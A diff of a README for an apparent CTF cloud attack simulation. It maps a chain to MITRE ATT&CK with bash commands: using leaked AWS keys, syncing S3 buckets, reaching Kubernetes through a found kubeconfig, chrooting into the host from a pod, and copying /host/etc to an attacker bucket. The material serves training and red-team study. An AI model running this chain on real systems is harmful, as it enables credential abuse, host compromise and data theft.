@@ -1,119 +1,145 @@
-> This repository is for educational and ethical testing purposes only. Do not use any information here on unauthorized systems.
+# Essential Tools to Win Magic CTF
 
-# Essential-Tools-to-Win-Magic-CTF
+## cloudcreds2exfil – Cloud Security Simulation
 
-#  cloudcreds2exfil – From Clues to Cluster
-
->  A cloud adversary simulation that begins with a tiny leak and ends in full-blown compromise. Can you trace the entire chain?
-
----
-
-## The Premise
-
-You have discovered an unguarded secret. Somewhere in this repo lies a path that leads from the cloud to the cluster — and deeper still.
-
-Each phase builds upon the last. Stay sharp, question everything.
+**Disclaimer:**  
+This repository is for **educational use only** in authorized environments such as CTFs, cloud labs, or security training ranges. Do not use any part of this project on real systems without permission.
 
 ---
 
-## Objectives
--Exfiltrate data from unexpected places
+## Overview
 
+The match was meant to be routine, until someone on the team leaked the game plan. An unexpected player slipped in, disguised and unmarked. What followed was a silent play, moving past the midfield, breaching the last line, and walking the ball into the net. By the time the Avengers noticed, the scoreboard had already changed.
 
-### Phase 1: Something’s hiding in plain sight  
-> _"Source code rarely lies. Look deep, not wide."
+---
 
-You’ve found a pair of keys. But who do they belong to?
+## Attack Chain Simulation
 
-- **T1528: Steal Application Access Token**
-- **T1552.001: Unprotected Credentials in Files**
+---
 
-####  Commands
+## Commands & Mapping
 
-# Configure the AWS CLI with the leaked keys
+### Step 1: Configure Leaked Cloud Credentials
+
+Use the credentials to authenticate via AWS CLI.
+
+**MITRE ATT&CK:**  
+T1528 – Steal Application Access Token  
+T1552.001 – Unprotected Credentials in Files
+
+```bash
 aws configure
-
-# Confirm identity
 aws sts get-caller-identity
+```
 
-  ### Phase 2: Objects may be closer than they appear  
-> _"They left the door ajar — you just need to push."_
+---
 
-The object store knows more than it should.
+### Step 2: Discover and Access Cloud Storage
 
-** MITRE ATT&CK Mapping**  
-- **T1530**: Data from Cloud Storage Object  
-- **T1083**: File and Directory Discovery
+List available buckets and explore their contents. Look for sensitive data like configuration files.
 
-####  Commands
+**MITRE ATT&CK:**  
+T1530 – Data from Cloud Storage Object  
+T1083 – File and Directory Discovery
 
-# List accessible buckets
+```bash
 aws s3 ls
+aws s3 ls s3://<bucket-name>
+aws s3 sync s3://<bucket-name> ./downloaded-data
+```
 
-# Explore an interesting bucket
-aws s3 ls s3://<your-s3-bucket-name>
+---
 
-# Download everything from the bucket
-aws s3 sync s3://<your-s3-bucket-name> ./<your-local-sync-dir>
+### Step 3: Gain Kubernetes Cluster Access
 
-### Phase 3: A config speaks volumes  
-> _"You now speak the cluster’s language."_
+You’ve found a `kubeconfig` file in the bucket. Use it to authenticate with the Kubernetes cluster.
 
-With kubeconfig in hand, you're not just an outsider anymore.
+**MITRE ATT&CK:**  
+T1592.002 – Gather Cloud Infra Config: Container Orchestration  
+T1609 – Kubernetes API Access
 
-** MITRE ATT&CK Mapping**  
-- **T1592.002**: Gather Cloud Infrastructure Configuration - Container Orchestration  
-- **T1609**: Kubernetes API Access
-
-# Set the path to the retrieved kubeconfig file
-export KUBECONFIG=<path-to-your-kubeconfig>
-
-# Verify cluster access
-kubectl get pods -A
+```bash
+export KUBECONFIG=downloaded-data/kubeconfig
 kubectl get nodes
+kubectl get pods -A
+```
 
-###  Phase 4: Craft with intent  
-> _"Containers are guests — some overstay and snoop around."_
+---
 
-You don’t need a weapon. Just access.
+### Step 4: Deploy a Container for Reconnaissance
 
-** MITRE ATT&CK Mapping**  
-- **T1610**: Deploy Container  
-- **T1611**: Escape to Host
-  
-####  Commands
-kubectl apply -f <pod-manifest>.yaml
-kubectl exec -it <<podname>> -- /bin/bash
+Deploy a pod with a basic shell container to explore the cluster. This simulates lateral movement.
 
-###  Phase 5: Crossing the line  
-> _"If you're reading this, you’re probably in the wrong place."_
+**MITRE ATT&CK:**  
+T1610 – Deploy Container  
+T1611 – Escape to Host
 
-Your pod can see more than it should.
+```bash
+kubectl apply -f <<name>.yaml
+kubectl get pods
+kubectl exec -it <name> -- /bin/bash
+```
 
-** MITRE ATT&CK Mapping**  
-- **T1057**: Process Discovery  
-- **T1082**: System Information Discovery
+---
 
+### Step 5: Inspect Host from the Pod
+
+If the pod has access to host volumes (e.g., `/host`), explore the underlying node to simulate privilege escalation.
+
+**MITRE ATT&CK:**  
+T1057 – Process Discovery  
+T1082 – System Information Discovery
+
+```bash
 ls /host
-chroot /host  
+chroot /host
 hostname
+```
 
-### Phase 6: Leave a trail — or don’t  
-> _"Loot is only valuable when carried out."_
+---
 
-** MITRE ATT&CK Mapping**  
-- **T1537**: Transfer Data to Cloud Account  
-- **T1005**: Data from Local System  
-- **T1041**: Exfiltration Over C2 Channel
+### Step 6: Simulate Exfiltration of Data
 
+If credentials are available in the host or pod, use them to upload data to an attacker-controlled bucket.
 
-# use AWS CLI from host (if credentials found)
+**MITRE ATT&CK:**  
+T1537 – Transfer Data to Cloud Account  
+T1005 – Data from Local System  
+T1041 – Exfiltration Over C2 Channel
 
-#  sync larger loot
-aws s3 sync <<object>> s3://<your-exfil-bucket>/<objects>>
+```bash
+aws s3 sync /host/etc s3://<your-exfil-bucket>/etc-backup
+```
 
+---
 
+## MITRE ATT&CK Summary
 
+| Stage | Techniques |
+|-------|------------|
+| Initial Access | T1528, T1552.001 |
+| Storage Discovery | T1530, T1083 |
+| Cluster Access | T1592.002, T1609 |
+| Container Deployment | T1610, T1611 |
+| Host Discovery | T1057, T1082 |
+| Data Exfiltration | T1537, T1005, T1041 |
 
+---
 
+## Usage Guidelines
 
+- Use only in test environments (e.g., personal AWS account, private CTFs, cyber ranges).
+- Never use these techniques in production systems or without explicit permission.
+- Designed for red vs. blue team simulations, training, and awareness.
+
+---
+
+## License
+
+MIT License – Use allowed for educational and research purposes only.
+
+---
+
+## Contact
+
+Open an issue or contact the maintainers for questions or suggestions.
